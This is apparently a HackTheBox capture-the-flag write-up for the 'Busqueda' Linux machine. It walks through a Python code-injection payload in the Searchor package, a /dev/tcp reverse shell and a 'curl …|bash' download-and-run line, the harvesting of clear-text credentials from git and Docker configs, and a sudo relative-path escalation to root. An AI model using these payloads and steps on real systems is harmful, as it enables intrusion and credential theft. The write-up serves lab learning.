---
render_with_liquid: false
title: HackTheBox Writeup  Busqueda
date: 2023-04-16 05:36:58 +1400
tags: [hackthebox, linux, nmap, python, python-flask, searchor, injection, code-injection, subdomain, docker, docker-inspect, gitea, git, clear-text-credentials, discover-secrets, sudo, python-script, mysql, password-reuse, oscp-like-2023]
---



Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a `Python` module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to `root`, we discover credentials within a `Git` config file, allowing us to log into a local `Gitea` service. Additionally, we uncover that a system checkup script can be executed with `root` privileges by a specific user. By utilizing this script, we enumerate `Docker` containers that reveal credentials for the `administrator` user's `Gitea` account. Further analysis of the system checkup script&amp;amp;#039;s source code in a `Git` repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with `root` privileges.


# Recon
---

## Nmap

```bash

# Nmap 7.93 scan initiated Sun Apr 16 05:36:58 2023 as: nmap -sVC -p- -T4 -Pn -vv -oA busqueda 10.10.11.208
Nmap scan report for 10.10.11.208
Host is up, received user-set (0.094s latency).
Scanned at 2023-04-16 05:36:58 EDT for 148s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Apr 16 05:39:26 2023 -- 1 IP address (1 host up) scanned in 147.89 seconds
```

Add to hosts

```bash
┌──(root㉿kali)-[~/Busqueda]
└─# echo '10.10.11.208 searcher.htb' >> /etc/hosts
```


## 80 - Searcher


### Info

![](/assets/obsidian/27806f3a5bd47540371640a588b2414a.png)

![](/assets/obsidian/342e7207de8c28af8cc4af7daefaa025.png)


# User Flag
---

## Code Injection

It's using a python package : [Searchor](https://github.com/ArjunSharda/Searchor)

![](/assets/obsidian/491567667acd8d2fc8b3c2177a3fae6d.png)

Got to the [releases](https://github.com/ArjunSharda/Searchor/releases) page

Search versions above **v2.4.0**

![](/assets/obsidian/584e12167c8f0bf5038628c106ab6888.png)

Found a vulnerability fix request

https://github.com/ArjunSharda/Searchor/pull/130

![](/assets/obsidian/f1fb57aa241e014fb2bd9213ab5f1b19.png)

![](/assets/obsidian/7e4bd7875bbd81490c9e7800afa24b02.png)

Download the release then test it on local

```bash
┌──(root㉿kali)-[~/Busqueda]
└─# wget https://github.com/ArjunSharda/Searchor/archive/refs/tags/v2.4.0.zip

┌──(root㉿kali)-[~/Busqueda]
└─# unzip v2.4.0.zip

┌──(root㉿kali)-[~/Busqueda]
└─# cd Searchor-2.4.0

┌──(root㉿kali)-[~/Busqueda/Searchor-2.4.0]
└─# python3 setup.py install

┌──(root㉿kali)-[~/Busqueda/Searchor-2.4.0]
└─# searchor search Google "',__import__('os').system('id'))#"
uid=0(root) gid=0(root) groups=0(root)
https://www.google.com/search?q=
```

![](/assets/obsidian/95669a942d28d9f7aa696325105c0ea8.png)

Host reverse shell

```bash
┌──(root㉿kali)-[~/Busqueda]
└─# mkdir www

┌──(root㉿kali)-[~/Busqueda]
└─# echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.12/1111 0>&1"' > www/rev.sh

┌──(root㉿kali)-[~/Busqueda]
└─# cd www

┌──(root㉿kali)-[~/Busqueda/www]
└─# python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Trigger payload

```bash
',__import__('os').system('curl 10.10.14.12/rev.sh|bash'))#
```

![](/assets/obsidian/8129798740e44792e527c703793617f0.png)

![](/assets/obsidian/c14dd974929d72937e0e125686a9785f.png)

```bash
┌──(root㉿kali)-[~/Busqueda]
└─# nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.208] 33920
bash: cannot set terminal process group (1688): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
svc@busqueda:/var/www/app$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(root㉿kali)-[~/Busqueda]
└─# stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

svc@busqueda:/var/www/app$ cd ~
svc@busqueda:~$ cat user.txt
51e980e3a312ab7cbb7db4d6ecdc0f92
```


# Root Flag
---

## Discover gitea Virtual Host

Checked sudo (need password), SUID, pspy, nothing found

Use linpeas

```bash
┌──(root㉿kali)-[~/Busqueda]
└─# cd /opt/tools/privesc

┌──(root㉿kali)-[/opt/tools/privesc]
└─# python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
svc@busqueda:/proc$ curl 10.10.14.12/linpeas.sh|bash
```

Found vhost: `gitea.searcher.htb`

![](/assets/obsidian/7cc246e1cdb5ed11d3ffae9778facceb.png)

Add to hosts

```bash
┌──(root㉿kali)-[~/Busqueda]
└─# echo '10.10.11.208 gitea.searcher.htb' >> /etc/hosts
```


## Login to Gitea

Visit page

![](/assets/obsidian/25190319a23903e55bbfe7eecb9c1305.png)

![](/assets/obsidian/02b78bae2c3d30d8294ee0cfba10acc5.png)

Search : `gitea 1.18.0 exploit`, Nothing found

Search through releases after `V1.18.0`

https://github.com/go-gitea/gitea/releases

![](/assets/obsidian/9b1b069fd5073c0383dee1e3378145e6.png)

Search everything related to `gitea` 

```bash
svc@busqueda:~$ grep -Rin gitea / 2>/dev/null
/var/lib/dpkg/info/ucf.templates:50:Description-eu.UTF-8: Zer egitea nahi duzu aldatutako ${BASENAME} konfigurazioko fitxategiarekin?
...
/var/www/app/.git/logs/HEAD:1:0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator <administrator@gitea.searcher.htb> 1671970461 +0000       commit (initial): Initial commit
/var/www/app/.git/logs/refs/heads/main:1:0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator <administrator@gitea.searcher.htb> 1671970461 +0000    commit (initial): Initial commit
/var/www/app/.git/logs/refs/remotes/origin/main:1:0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator <administrator@gitea.searcher.htb> 1671970461 +0000   update by push
/var/www/app/.git/config:7:     url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```
- Got creds - `cody:jh1usoih2bkjaspwe92`

Didn't get the app path though, assuming it's running on docker

```bash
svc@busqueda:~$ docker ps
Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json": dial unix /var/run/docker.sock: connect: permission denied
```

Login to Gitea as user : `cody`

![](/assets/obsidian/f182f5fe69c1e8f78989899a04280933.png)

> Gathered another username : `Administrator`


## Privesc - Sudo

Try the creds gathered from git config on sudo

```bash
bash-5.1$ sudo -l
[sudo] password for svc:
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
bash-5.1$
```

```bash
bash-5.1$ python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea
```

```bash
┌──(root㉿kali)-[/opt/tools/privesc]
└─# echo -n <RESULT> | jq .

  "Env": [                                                                                                                                                                                                           "USER_UID=115",
    "USER_GID=121",
    "GITEA__database__DB_TYPE=mysql",
    "GITEA__database__HOST=db:3306",
    "GITEA__database__NAME=gitea",
    "GITEA__database__USER=gitea",                                                                                                                                                                                   "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",                                                                                                                                             "USER=git",
    "GITEA_CUSTOM=/data/gitea"                                                                                                                                                                                     ],
```

```bash
bash-5.1$ python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db
{"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
```

```bash
bash-5.1$ mysqldump -u gitea -p'yuiu1hoiu4i5ho1uh' -A
mysqldump: Got error: 2002: Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2) when trying to connect
```

Try the creds in gitea

After a few tries, login successfully as user : `Administrator` with the password : `yuiu1hoiu4i5ho1uh`

![](/assets/obsidian/64674c2b053dc2293e3c733ba62ea22b.png)

![](/assets/obsidian/f19614030bf90a398ed4b1279716e1cb.png)

> `system-checkup.py`

![](/assets/obsidian/3516d688979410a82434f97a4b690aee.png)

Created self defined `./full-checkup.sh`

> Using **pwncat-cs**

```bash
(remote) svc@busqueda:/tmp$ cd /dev/shm/
(remote) svc@busqueda:/dev/shm$ echo -e '#!/bin/bash\ncurl 10.10.14.32/rev.sh|bash' > full-checkup.sh
(remote) svc@busqueda:/dev/shm$ chmod +x ./full-checkup.sh
(remote) svc@busqueda:/dev/shm$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
<CTRL + D>
(local) pwncat$ sessions
Active Sessions
     ╷      ╷                                  ╷          ╷        ╷
  ID │ User │ Host ID                          │ Platform │ Type   │ Address
 ════╪══════╪══════════════════════════════════╪══════════╪════════╪════════════════════
  4  │ svc  │ a8a362aa57c442276b52b86ca596b34f │ linux    │ Socket │ 10.10.11.208:46302
  5  │ svc  │ a8a362aa57c442276b52b86ca596b34f │ linux    │ Socket │ 10.10.11.208:46816
  6  │ root │ a8a362aa57c442276b52b86ca596b34f │ linux    │ Socket │ 10.10.11.208:35534
     ╵      ╵                                  ╵          ╵        ╵
(local) pwncat$ sessions 6
[11:32:59] targeting session-6 (10.10.11.208:35534)                                                                                                                                                sessions.py:88
(local) pwncat$ id
[11:33:01] error: id: unknown command                                                                                                                                                              manager.py:957
(local) pwncat$                                                                                                                                                                             
(remote) root@busqueda:/dev/shm# cd ~
(remote) root@busqueda:/root# cat root.txt
f1ae5c8e47b49b5172f6c04b71f6612c
(remote) root@busqueda:/root#
```

![](/assets/obsidian/d5c399c3cca0f1bad622325a3a0d7b01.png)